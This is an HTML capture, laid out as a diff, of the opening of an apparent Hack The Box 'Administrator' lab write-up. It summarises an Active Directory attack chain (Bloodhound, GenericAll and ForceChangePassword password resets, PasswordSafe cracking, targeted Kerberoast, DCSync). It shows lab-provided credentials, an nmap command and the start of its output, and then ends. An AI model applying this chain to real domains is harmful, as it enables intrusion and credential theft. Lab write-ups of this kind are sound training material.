+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/pentest-notes/windows/"
+    
+  >Windows
+    </a>
+              
+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/pentest-notes/projects/"
+    
+  >Projects
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a>
+              <div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/pentest-notes/projects/inithack/"
+    
+  >InitHACK: Automate Pentesting Folder Setup and Nmap Scans.
+    </a>
+              
+            </li></ul>
+      </div>
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/about/"
+    
+  >About
+    </a></li>
+    </ul>
+
+    <ul class="hx:flex hx:flex-col hx:gap-1 hx:max-md:hidden">
+        
+          <li class=""><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/easy/"
+    
+  >Easy
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/easy/sea-htb/"
+    
+  >Sea - Hack The Box
+    </a>
+              
+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/easy/analytics-htb/"
+    
+  >Analytics - Hack The Box
+    </a>
+              
+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/easy/delivery-htb/"
+    
+  >Delivery - Hack The Box
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class="open"><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/medium/"
+    
+  >Medium
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col open"><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      sidebar-active-item hx:bg-primary-100 hx:font-semibold hx:text-primary-800 hx:contrast-more:border hx:contrast-more:border-primary-500 hx:dark:bg-primary-400/10 hx:dark:text-primary-600 hx:contrast-more:dark:border-primary-500"
+    href="/htb/medium/administrator/"
+    
+  >Administrator - Hack The Box 
+    </a>
+              
+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/medium/survellance-htb/"
+    
+  >Survellance - Hack The Box
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/htb/hard/"
+    
+  >Hard
+    </a></li>
+        
+      </ul>
+    </div>
+  
+  
+    <div class="  hx:sticky hx:bottom-0 hx:max-h-(--menu-height) hx:bg-white hx:dark:bg-dark hx:mx-4 hx:py-4 hx:shadow-[0_-12px_16px_#fff] hx:flex hx:items-center hx:gap-2 hx:border-gray-200 hx:dark:border-neutral-800 hx:dark:shadow-[0_-12px_16px_#111] hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:shadow-none hx:border-t" data-toggle-animation="show"><div class="hx:flex hx:grow hx:flex-col"><button
+  title="Change theme"
+  data-theme="light"
+  class="theme-toggle hx:cursor-pointer hx:group hx:h-7 hx:rounded-md hx:px-2 hx:text-left hx:text-xs hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50"
+  type="button"
+  aria-label="Change theme"
+>
+  <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="hx:group-data-[theme=light]:hidden">Light</span><svg height=12 class="hx:group-data-[theme=dark]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="hx:group-data-[theme=dark]:hidden">Dark</span></div>
+</button>
+</div></div></aside>
+    
+<nav class="hextra-toc hx:order-last hx:hidden hx:w-64 hx:shrink-0 hx:xl:block hx:print:hidden hx:px-4" aria-label="table of contents">
+    <div class="hextra-scrollbar hx:sticky hx:top-16 hx:overflow-y-auto hx:pr-4 hx:pt-6 hx:text-sm [hyphens:auto] hx:max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] hx:ltr:-mr-4 hx:rtl:-ml-4"><p class="hx:mb-4 hx:font-semibold hx:tracking-tight">On this page</p><ul>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-semibold hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#enumeration">Enumeration
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#port-scan">Port Scan
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#running-bloodhound-as-olivia">Running Bloodhound as Olivia
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-semibold hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#foothold">Foothold
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#genericall-over-michael">GenericAll over Michael.
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#forcechangepassword-over-benjamin">ForceChangePassword over Benjamin.
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#ftp-access">FTP Access.
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-semibold hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#passwordsafe3-file">PasswordSafe3 File.
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#extracting--cracking-psafe-hash">Extracting &amp; Cracking psafe Hash.
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#checking-psafe3-content">Checking .psafe3 content.
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-semibold hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#targeted-kerberoast">Targeted Kerberoast
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#what-is-a-targeted-kerberoast-attack">What is a targeted Kerberoast attack?
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#performing-the-attack">Performing The Attack.
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-semibold hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#dcsync-attack">DCSync Attack.
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-semibold hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#references">References:
+        </a>
+      </li></ul>
+      <div class="hx:mt-8 hx:border-t hx:bg-white hx:pt-8 hx:shadow-[0_-12px_16px_white] hx:dark:bg-dark hx:dark:shadow-[0_-12px_16px_#111] hx:sticky hx:bottom-0 hx:flex hx:flex-col hx:items-start hx:gap-2 hx:pb-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-t hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:border-neutral-400">
+        <button aria-hidden="true" id="backToTop" onClick="scrollUp();" class="hx:cursor-pointer hx:transition-all hx:duration-75 hx:opacity-0 hx:text-xs hx:font-medium hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-100 hx:contrast-more:text-gray-800 hx:contrast-more:dark:text-gray-50">
+          <span>Scroll to top</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="hx:inline hx:ltr:ml-1 hx:rtl:mr-1 hx:h-3.5 hx:w-3.5 hx:rounded-full hx:border hx:border-gray-500 hx:hover:border-gray-900 hx:dark:border-gray-400 hx:dark:hover:border-gray-100 hx:contrast-more:border-gray-800 hx:contrast-more:dark:border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx:w-full hx:break-words hx:flex hx:min-h-[calc(100vh-var(--navbar-height))] hx:min-w-0 hx:justify-center hx:pb-8 hx:pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main class="hx:w-full hx:min-w-0 hx:max-w-6xl hx:px-6 hx:pt-4 hx:md:px-12">
+        <div class="content">
+          <h1>Administrator - Hack The Box </h1>
+          <p><img src="/assets/images/HTB/Administrator/Administrator-LOGO.png" alt="Administrator-LOGO"  loading="lazy" /></p>
+<p>This Hack The Box Administrator machine is focused on exploitation of Active Directory weaknesses. Starting with user credentials, we used Bloodhound to map the domain, quickly identifying exploitable <code>GenericAll</code> permissions that allowed us to reset passwords using tools like <code>net rpc</code>.</p>
+<p>Our investigation then uncovered an FTP server with a PasswordSafe file. Cracking this file with <code>pwsafe2john</code> and John the Ripper provided further credentials, which we leveraged to exploit ForceChangePassword privileges and perform a targeted Kerberoast for even higher access. The final step involved a <code>DCSync</code> attack via Impacket, retrieving domain admin hashes and granting complete control. This showcases a direct path from initial access to domain dominance by chaining AD misconfigurations and service vulnerabilities.</p>
+<div class="hx:overflow-x-auto hx:mt-6 hx:flex hx:rounded-lg hx:border hx:py-2 hx:ltr:pr-4 hx:rtl:pl-4 hx:contrast-more:border-current hx:contrast-more:dark:border-current hx:border-blue-200 hx:bg-blue-100 hx:text-blue-900 hx:dark:border-blue-200/30 hx:dark:bg-blue-900/30 hx:dark:text-blue-200">
+  <div class="hx:ltr:pl-3 hx:ltr:pr-2 hx:rtl:pr-3 hx:rtl:pl-2"><div class="hx:select-none hx:text-xl" style="font-family: 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';">ℹ️</div></div>
+
+  <div class="hx:w-full hx:min-w-0 hx:leading-7">
+    <div class="hx:mt-6 hx:leading-7 hx:first:mt-0"><p>Tags:</p>
+<details class="hx:last-of-type:mb-0 hx:rounded-lg hx:bg-neutral-50 hx:dark:bg-neutral-800 hx:p-2 hx:mt-4 hx:group" >
+  <summary class="hx:flex hx:items-center hx:cursor-pointer hx:select-none hx:list-none hx:p-1 hx:rounded-sm hx:transition-colors hx:hover:bg-gray-100 hx:dark:hover:bg-neutral-800 hx:before:mr-1 hx:before:inline-block hx:before:transition-transform hx:before:content-[''] hx:dark:before:invert hx:rtl:before:rotate-180 hx:group-open:before:rotate-90">
+    <strong class="hx:text-lg">show tags</strong>
+  </summary>
+  <div class="hx:p-2 hx:overflow-hidden">
+    <ul>
+<li>Windows</li>
+<li>Active Directory</li>
+<li>Bloodhound</li>
+<li>GenericAll</li>
+<li>FTP</li>
+<li>ForceChangePassword</li>
+<li>psafe3</li>
+<li>passwordsafe</li>
+</ul>
+  </div>
+</details></div>
+  </div>
+</div>
+
+<h2>Enumeration<span class="hx:absolute hx:-mt-20" id="enumeration"></span>
+    <a href="#enumeration" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><div class="hx:overflow-x-auto hx:mt-6 hx:flex hx:rounded-lg hx:border hx:py-2 hx:ltr:pr-4 hx:rtl:pl-4 hx:contrast-more:border-current hx:contrast-more:dark:border-current hx:border-yellow-100 hx:bg-yellow-50 hx:text-yellow-900 hx:dark:border-yellow-200/30 hx:dark:bg-yellow-700/30 hx:dark:text-yellow-200">
+  <div class="hx:ltr:pl-3 hx:ltr:pr-2 hx:rtl:pr-3 hx:rtl:pl-2"><div class="hx:select-none hx:text-xl" style="font-family: 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';">⚠️</div></div>
+
+  <div class="hx:w-full hx:min-w-0 hx:leading-7">
+    <div class="hx:mt-6 hx:leading-7 hx:first:mt-0"><p><strong>User Credentials!</strong></p>
+<p>The following information was provided by Hack The Box:</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>As is common in real-life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<ul>
+<li><strong>Username:</strong> Olivia</li>
+<li><strong>Password:</strong> ichliebedich</li>
+</ul>
+</div>
+  </div>
+</div>
+
+<p>As always let&rsquo;s start by enumerating the target with the help of NMAP.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sS -sV -sC -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,58289,61803,61807,61809,61831,61864 -Pn -n -vvv -oA nmap/allPorts 10.10.11.42</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h3>Port Scan<span class="hx:absolute hx:-mt-20" id="port-scan"></span>
+    <a href="#port-scan" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Nmap 7.95 scan initiated Wed Apr  2 12:09:36 2025 as: /usr/lib/nmap/nmap -sS -sV -sC -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,58289,61803,61807,61809,61831,61864 -Pn -n -vvv -oA nmap/allPorts 10.10.11.42</span>
+</span></span><span class="line"><span class="cl"><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.42</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">user</span><span class="o">-</span><span class="nb">set</span> <span class="p">(</span><span class="mf">0.068</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Scanned</span> <span class="n">at</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">02</span> <span class="mi">12</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="mi">37</span> <span class="n">EDT</span> <span class="k">for</span> <span class="mi">74</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>       <span class="n">REASON</span>          <span class="n">VERSION</span>
